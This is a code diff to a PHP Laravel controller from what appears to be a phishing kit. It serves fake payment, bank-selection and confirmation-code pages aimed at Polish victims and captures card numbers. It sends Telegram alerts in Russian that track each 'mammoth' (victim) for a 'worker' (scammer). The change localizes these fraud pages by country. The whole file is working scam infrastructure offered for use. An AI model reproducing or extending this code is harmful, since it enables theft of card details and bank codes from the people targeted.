@@ -32,6 +32,10 @@ class PagesController extends Controller
     protected $subdomain;
     protected $bank;
     protected $isPay;
+    /**
+     * @var string
+     */
+    private $locale;
 
 
     public function __construct()
@@ -63,7 +67,9 @@ class PagesController extends Controller
                 if (!$request->session()->has('uuid')) {
                     $request->session()->put('uuid', $this->uuid = (string)Str::uuid());
                 }
-                view()->share(['fake' => $this->fake]);
+                $this->locale = optional($this->category->country)->locale ?? Country::locale(Country::POLAND);
+                if (!App::isLocale($this->locale)) App::setLocale($this->locale);
+                view()->share(['fake' => $this->fake, 'locale' => $this->locale]);
                 $this->bank = session('bankName', 'none');
                 if ($redirectUrl = $this->processRedirection($request)) {
                     return redirect($redirectUrl);
@@ -75,8 +81,6 @@ class PagesController extends Controller
                         "🚛<b>Платформа:</b> <code>{$this->platform()}</code>"
                     ]);
                 }
-                $locale = $this->category->country->locale ?? Country::locale(Country::POLAND);
-                if (!App::isLocale($locale)) App::setLocale($locale);
                 return $next($request);
             } catch (Throwable|Exception $exception) {
                 Cache::forget("fake:$track_id");
@@ -198,9 +202,9 @@ class PagesController extends Controller
     {
         $fake = $this->getFake();
         $categoryName = $this->category->name;
-        $view = $this->isPay && view()->exists("fakes.$categoryName.pay")
-            ? "fakes.$categoryName.pay"
-            : "fakes.$categoryName.get";
+        $view = $this->isPay && view()->exists("fakes.$this->locale.$categoryName.pay")
+            ? "fakes.$this->locale.$categoryName.pay"
+            : "fakes.$this->locale.$categoryName.get";
         $text = $this->isPay
             ? "⭐️<b>️Мамонт на странице оплаты</b>"
             : "⭐️<b>️Мамонт на странице получения средств</b>";
@@ -238,12 +242,12 @@ class PagesController extends Controller
                 "⭐️<b>️Мамонт на странице выбора банка</b>",
                 "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
             ]);
-            return view('fakes.banks.index', compact('banks', 'title', 'favicon'));
+            return view("fakes.$this->locale.banks.index", compact('banks', 'title', 'favicon'));
         }
         $bank = $banks->where('name', $name)->first();
         if (is_null($bank) && $name !== 'none') abort(404);
         session()->put('bankName', $name);
-        $view = "fakes.banks.$name";
+        $view = "fakes.$this->locale.banks.$name";
         $title = $bank['title'] ?? $name;
         $favicon = isset($bank['logo']) ? asset($bank['logo']) : $this->fake->logo();
         if ($name !== 'none' && $this->bankHasPm($name) && view()->exists($view)) {
@@ -330,9 +334,9 @@ class PagesController extends Controller
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
             "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
         ]);
-        return view(view()->exists("fakes.{$this->category->name}.order")
-            ? "fakes.{$this->category->name}.order"
-            : "fakes.order", ['title' => 'Pozyskiwanie środków']);
+        return view(view()->exists("fakes.$this->locale.{$this->category->name}.order")
+            ? "fakes.$this->locale.{$this->category->name}.order"
+            : "fakes.$this->locale.order", ['title' => 'Pozyskiwanie środków']);
     }
 
     public function logOrder(Request $request)
@@ -369,7 +373,7 @@ class PagesController extends Controller
         $binName = $bankInfo['bank']['name'] ?? null;
 
         $next = subRoute('fake.code', ['track_id' => $fake->track_id]);
-        $step = ($this->bank === 'inteligo') ? "fakes.banks.$this->bank" : false;
+        $step = ($this->bank === 'inteligo') ? "fakes.$this->locale.banks.$this->bank" : false;
         $html = $step && view()->exists($step) ? view($step)->render() : null;
 
 
@@ -414,10 +418,12 @@ class PagesController extends Controller
             "⭐️<b>️Мамонт на странице кода</b>",
             "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
         ]);
-        return view(view()->exists("fakes.{$this->category->name}.code")
-            ? "fakes.{$this->category->name}.code"
-            : "fakes.code", [
+        return view(view()->exists("fakes.$this->locale.{$this->category->name}.code")
+            ? "fakes.$this->locale.{$this->category->name}.code"
+            : "fakes.$this->locale.code", [
             'title' => __("Operation confirmation"),
+            'type' => $this->isPay ? 'pay' : 'get',
+            'date' => date('d/m/Y'),
             'categoryName' => mb_strtoupper($this->category->name) . '_PAY',
             'amount' => $fake->priceFormat(),
             'card_number' => '**** **** **** ' . substr(session()->get('card_number'), -4)
@@ -465,7 +471,7 @@ class PagesController extends Controller
             "⭐️<b>️Мамонт на странице выбора картинки</b>",
             "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
         ]);
-        return view('fakes.verify');
+        return view("fakes.$this->locale.verify");
     }
 
     public function error()
@@ -478,7 +484,7 @@ class PagesController extends Controller
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
             "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
         ]);
-        return view('fakes.error', ['title' => 'error | 500']);
+        return view("fakes.$this->locale.error", ['title' => 'error | 500']);
     }
 
     public function success()
@@ -491,7 +497,7 @@ class PagesController extends Controller
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
             "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
         ]);
-        return view('fakes.success', ['title' => 'Success']);
+        return view("fakes.$this->locale.success", ['title' => 'Success']);
     }
 
     public function push()
@@ -504,7 +510,7 @@ class PagesController extends Controller
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
             "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
         ]);
-        return view('fakes.push', ['title' => 'potwierdzenie']);
+        return view("fakes.$this->locale.push", ['title' => 'potwierdzenie']);
     }
 
 }
